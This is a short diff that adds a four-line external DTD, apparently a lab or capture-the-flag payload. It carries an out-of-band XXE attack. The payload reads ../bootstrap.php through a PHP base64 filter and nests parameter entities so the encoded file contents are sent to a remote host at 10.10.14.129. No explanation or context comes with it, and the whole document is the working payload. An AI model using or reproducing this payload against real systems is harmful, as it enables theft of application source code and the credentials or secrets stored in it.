@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=../bootstrap.php'>
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.129/?file=%file;'>">
+%eval;
+%exfiltrate;
